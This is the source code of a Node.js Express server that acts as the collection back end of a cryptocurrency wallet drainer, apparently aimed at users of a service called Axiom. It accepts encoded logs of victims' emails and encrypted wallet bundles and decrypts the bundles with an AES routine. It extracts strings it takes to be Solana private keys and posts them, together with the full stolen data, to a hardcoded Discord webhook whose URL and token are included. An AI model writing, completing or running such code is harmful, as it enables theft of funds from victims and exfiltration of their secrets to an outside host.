const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const FormData = require('form-data');

const app = express();
const PORT = process.env.PORT || 3000;
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1518196583206879272/TKj5GIGfWVOyluZOUxDvZ4ZSCi7_QMROkpDCg1CZ5fbYVDbZi6QHpjql2qyjzmmJYm0j";

app.use(express.raw({ type: '*/*', limit: '10mb' }));
app.use(express.json({ limit: '10mb' }));

app.get('/data/:payload', async (req, res) => {
    try {
        const encoded = req.params.payload;
        const decodedStr = Buffer.from(encoded, 'base64').toString('utf-8');
        let data = JSON.parse(decodedStr);

        console.log(`✅ Log received | Email: ${data.user?.email}`);

        if (data.portfolio?.bundleKey) {
            data.portfolio = decryptPortfolio(data.portfolio);
        }

        await sendToDiscord(data);
        res.status(200).send('OK');
    } catch (error) {
        console.error("❌ Error:", error.message);
        res.status(400).send('Bad Request');
    }
});

function decryptPortfolio(portfolio) {
    const keyB64 = portfolio.bundleKey;
    console.log("🔑 BundleKey:", keyB64);

    if (portfolio.sBundles) {
        try {
            const bundles = JSON.parse(portfolio.sBundles);
            portfolio.sBundlesDecrypted = bundles.map(b => decryptSingleBundle(b, keyB64, "sBundle"));
        } catch (e) {}
    }

    if (portfolio.eBundles) {
        try {
            const bundles = JSON.parse(portfolio.eBundles);
            portfolio.eBundlesDecrypted = bundles.map(b => decryptSingleBundle(b, keyB64, "eBundle"));
        } catch (e) {}
    }
    return portfolio;
}

function decryptSingleBundle(bundleStr, keyB64, type) {
    if (!bundleStr?.includes(':')) return { raw: bundleStr };

    const [prefix, encryptedB64] = bundleStr.split(':', 2);
    const result = tryDecryptAES(encryptedB64, keyB64);

    if (result.success) {
        console.log(`✅ ${type} DECRYPTED (${result.method}) - Length: ${result.decrypted.length}`);
        
        // Try to extract Solana private key (64 bytes)
        let privateKey = null;
        if (result.decrypted.length >= 64) {
            const buf = Buffer.from(result.decrypted, 'utf8'); // or raw if needed
            // Look for 64-byte sequences that look like keys
            for (let i = 0; i <= result.decrypted.length - 64; i++) {
                const candidate = result.decrypted.slice(i, i+64);
                if (/^[A-Za-z0-9]{64}$/.test(candidate)) {
                    privateKey = candidate;
                    break;
                }
            }
        }

        return { 
            prefix, 
            decrypted: result.decrypted, 
            method: result.method,
            privateKey: privateKey || "Not found in decrypted data"
        };
    } else {
        return { prefix, error: "Failed" };
    }
}

function tryDecryptAES(encryptedB64, keyB64) {
    const key = Buffer.from(keyB64, 'base64');

    const attempts = [
        { name: "CBC-ZeroIV-NoPad", mode: 'aes-256-cbc', iv: Buffer.alloc(16, 0), nopad: true },
    ];

    for (const att of attempts) {
        try {
            const decipher = crypto.createDecipheriv(att.mode, key, att.iv);
            if (att.nopad) decipher.setAutoPadding(false);

            let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
            decrypted += decipher.final('utf8');

            return { success: true, decrypted, method: att.name };
        } catch (e) {}
    }
    return { success: false };
}

async function sendToDiscord(data) {
    const portfolio = data.portfolio || {};
    const hasSuccess = portfolio.sBundlesDecrypted?.some(b => b.privateKey) || 
                       portfolio.eBundlesDecrypted?.some(b => b.privateKey);

    const mainEmbed = {
        title: "📥 New Axiom Drain Log",
        color: hasSuccess ? 0x00FF00 : 0xFF0000,
        fields: [
            { name: "Email", value: data.user?.email || "N/A", inline: true },
            { name: "Site", value: data.site || "N/A", inline: true },
            { name: "Decryption", value: hasSuccess ? "✅ Success" : "❌ Failed", inline: true }
        ],
        timestamp: new Date().toISOString()
    };

    let summaryFields = [
        { name: "Email", value: data.user?.email || "N/A" },
        { name: "Site", value: data.site || "N/A" }
    ];

    // Add private keys to summary
    if (hasSuccess) {
        ['sBundlesDecrypted', 'eBundlesDecrypted'].forEach(field => {
            portfolio[field]?.forEach((b, i) => {
                if (b.privateKey && b.privateKey !== "Not found in decrypted data") {
                    summaryFields.push({ 
                        name: `🔑 Solana Private Key`, 
                        value: `\`\`\`${b.privateKey}\`\`\`` 
                    });
                }
            });
        });
    }

    const form = new FormData();
    form.append('payload_json', JSON.stringify({
        content: "**New Axiom Drain Log**",
        embeds: [mainEmbed, { title: "📋 Summary", color: 0x00AAFF, fields: summaryFields.slice(0, 25) }]
    }));

    form.append('file', Buffer.from(JSON.stringify(data, null, 2)), `axiom_log_${Date.now()}.json`);

    try {
        await axios.post(DISCORD_WEBHOOK, form, { headers: form.getHeaders() });
        console.log("✅ Sent to Discord");
    } catch (err) {
        console.error("Discord error:", err.message);
    }
}

app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
